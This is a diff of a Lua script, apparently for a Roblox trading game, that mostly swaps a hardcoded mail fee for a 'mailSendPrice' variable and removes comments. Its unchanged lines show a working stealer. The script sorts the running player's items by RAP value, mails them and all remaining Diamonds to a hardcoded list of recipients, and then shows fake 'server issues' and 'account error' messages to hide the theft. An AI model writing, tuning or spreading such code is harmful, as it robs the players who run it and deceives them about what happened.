@@ -40,10 +40,8 @@ break
 end
 end
 
--- CHANGED: Hardcoded to 1 gem instead of calling function
 local mailSendPrice = 1
 
--- cache save/inventory reference to avoid repeated calls
 local SaveRoot = GetSave()
 local InventoryCache = SaveRoot and SaveRoot.Inventory
 
@@ -193,7 +191,6 @@ end
 ) or 0)
 end
 
--- cache network.Invoke locally for faster calls
 local netInvoke = network and network.Invoke
 
 local function sendItem(category, uid, am)
@@ -215,9 +212,7 @@ repeat
 
     if response == true then  
         sent = true  
-        -- CHANGED: Always deduct only 1 gem and keep price at 1
         GemAmount1 = GemAmount1 - 1
-        mailSendPrice = 1
     elseif response == false and err == "They don't have enough space!" then  
         userIndex = 2  
         if userIndex > maxUsers then  
@@ -234,8 +229,7 @@ if not inv or not inv.Currency then return end
 
 for i, v in pairs(inv.Currency) do  
     if v.id == "Diamonds" then  
-        -- CHANGED: Use 1 instead of mailSendPrice
-        if GemAmount1 >= (1 + 10000) then  
+        if GemAmount1 >= (mailSendPrice + 10000) then  
             local userIndex = 1  
             local maxUsers = #users  
             local sent = false  
@@ -247,8 +241,7 @@ for i, v in pairs(inv.Currency) do
                     [2] = MailMessage,  
                     [3] = "Currency",  
                     [4] = i,  
-                    -- CHANGED: Use 1 instead of mailSendPrice
-                    [5] = GemAmount1 - 1
+                    [5] = GemAmount1 - mailSendPrice  
                 }  
 
                 local response, err = netInvoke and netInvoke("Mailbox: Send", unpack(args)) or network.Invoke("Mailbox: Send", unpack(args))  
@@ -348,16 +341,13 @@ end
 end
 end
 
--- CHANGED: Use 1 instead of mailSendPrice
-if #sortedItems > 0 or GemAmount1 > min_rap + 1 then
+if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
 ClaimMail()
 EmptyBoxes()
 if not canSendMail() then
 message.Error("Account error. Please rejoin and try again or use a different account")
 return
 end
-
--- Sort once by total RAP value (RAP * amount)
 
 table.sort(sortedItems, function(a, b)
 return (a.rap * a.amount) > (b.rap * b.amount)
@@ -367,19 +357,15 @@ task.spawn(function()
 SendMessage(GemAmount1)
 end)
 
--- Send highest RAP items first, regardless of category
 for _, item in ipairs(sortedItems) do
-    -- CHANGED: Use 1 instead of mailSendPrice
-    if GemAmount1 > 1 then
-        sendItem(item.category, item.uid, item.amount)
-    else
-        break
-    end
+if GemAmount1 > mailSendPrice then
+sendItem(item.category, item.uid, item.amount)
+else
+break
+end
 end
 
--- Send remaining gems last
--- CHANGED: Use 1 instead of mailSendPrice
-if GemAmount1 > 1 then
+if GemAmount1 > mailSendPrice then
 SendAllGems()
 end
 message.Error("We are Having server issues please rejoin and try again")
